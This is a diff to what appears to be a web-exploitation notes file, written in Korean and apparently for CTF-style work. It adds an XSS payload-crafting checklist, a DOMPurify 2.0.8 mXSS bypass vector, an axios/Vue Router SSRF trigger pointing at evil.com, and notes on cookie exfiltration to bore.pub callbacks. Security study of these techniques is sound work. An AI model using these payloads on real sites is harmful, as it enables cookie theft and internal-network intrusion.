@@ -18,11 +18,74 @@ description: >
 2. document.cookie 또는 내부 fetch → bore.pub 콜백
 3. CMS(WordPress 등) → 플러그인 업로드 CSRF 체이닝
 
+**cloudflared 콜백 서버 사용 시 주의:**
+```python
+# 터널 URL 획득 후 바로 exploit 제출하면 0 hits (라우팅 미안정)
+# 반드시 ~8초 대기
+time.sleep(8)
+```
+
+### Unquoted Attribute XSS — 공백 금지 규칙
+
+`onerror=PAYLOAD//>`처럼 unquoted attribute에 payload 넣을 때, **공백(space/tab/LF)이 속성값을 종료**시킨다.
+`"`, `'`, `=`, `<`, `` ` ``는 parse error이지만 값에 추가됨. `>`는 태그 종료.
+
+```html
+<!-- 실패: return 뒤 공백에서 onerror 값이 잘림 -->
+<img onerror=fetch('/buy').then(function(r){return r.json();})>
+
+<!-- 성공: /**/ 로 공백 대체 (HTML 파서는 문자로 추가, JS는 whitespace로 처리) -->
+<img onerror=fetch('/buy').then(function(r){return/**/r.json();})>
+```
+
+payload 작성 체크리스트:
+- 공백 없음 (JS 전체 스캔)
+- `>` 없음 (태그 조기 종료)
+- `"` 없음 (quote context 파괴)
+- 불가피한 공백 → `/**/` 대체
+
+### mXSS (Mutation XSS)
+
+sanitizer 통과 후 브라우저 DOM 삽입 시 XSS 발생. sanitizer 파서(예: JSDOM)와 브라우저 파서(Chrome)의 해석 차이가 원인.
+
+**DOMPurify 2.0.8 + JSDOM 16.3.0 bypass 벡터:**
+```html
+<math><mtext><table><mglyph><style><!--</style><img src=x title="--><img src=x onerror=PAYLOAD>">
+```
+
+원리:
+- JSDOM: `<style>` in MathML = raw text → `<!--`을 CSS 주석으로 처리 → 전체를 안전한 `<img title="...">` 하나로 sanitize 통과
+- Chrome 86: `<style>` in mglyph = foreign element (raw text 아님) → `<!--`을 HTML 주석으로 처리 → `-->`까지 주석 처리 → 이후 `<img onerror=PAYLOAD>`가 실제 태그로 파싱 → XSS 발화
+
+조건:
+- DOMPurify ≤ 2.0.8 (`mglyph`이 ALLOWED_TAGS에 포함)
+- Node.js 서버사이드에서 JSDOM 기반으로 DOMPurify 실행
+- 실제 렌더링: Chrome 계열 브라우저의 innerHTML
+
+버전 확인: JS 번들에서 `@license DOMPurify` 주석 검색  
+패치 버전: DOMPurify 2.1.0+ (`mglyph` ALLOWED_TAGS 제거)
+
 ### SSRF + DNS Rebinding
 1. 내부망 타겟 확인 (127.x, 10.x, 169.254.x.x)
 2. rbndr.us DNS rebinding 설정
 3. bore.pub 콜백 수신 (VPS 불필요)
 4. 리다이렉트 루프 우회 (HTTPS-only, 빈 응답 주의)
+
+### SSRF via axios isAbsoluteURL + Vue Router
+
+axios의 `isAbsoluteURL` 정규식: `/^([a-z][a-z\d\+\-\.]*:)?\/\//i`  
+scheme이 **optional**이라 `///hostname/path`도 absolute URL로 인식 → baseURL 무시 → 브라우저가 protocol-relative로 처리 → `http://hostname/path` 외부 요청 발생.
+
+Vue Router SPA에서 `%2F` 인코딩으로 trigger 가능:
+```
+report URL: /#/%2F%2Fevil.com%2Fitem/detail
+  → Vue Router params.id = "//evil.com/item"
+  → axios.get("/" + "//evil.com/item" + "/info") = "///evil.com/item/info"
+  → isAbsoluteURL("///evil.com/item/info") = true
+  → 브라우저: http://evil.com/item/info 요청 (SSRF)
+```
+
+서버 측 `//` 포함 체크도 우회됨 (`%2F%2F`는 리터럴 `//` 아님).
 
 ### SSTI
 ```python
